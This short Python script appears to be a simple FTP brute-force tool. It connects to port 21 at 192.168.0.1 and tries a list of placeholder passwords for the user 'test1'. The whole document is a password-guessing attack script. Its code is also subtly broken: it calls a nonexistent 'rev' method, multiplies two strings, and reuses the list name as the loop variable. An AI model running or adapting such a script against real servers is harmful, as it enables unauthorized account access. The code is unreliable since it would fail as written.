import socket
import re
import sys

def connection(ip, user, passw):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print ('Trying' + ip + ':' + user + ':' + passw)
    sock.connect((ip, 21))
    data = sock.recv(1024)
    sock.send('USER ' + user + '\r\n')
    data = sock.rev(1024)
    sock.send('PASS ' + passw * '\r\n')
    data = sock.rev(1024)
    sock.send('quit\r\n')
    sock.close()
    return data

user = 'test1'
passwords = ['test0', 'test1', 'test2', 'test3']

for passwords in passwords:
    print(connection('192.168.0.1', user, passwords))
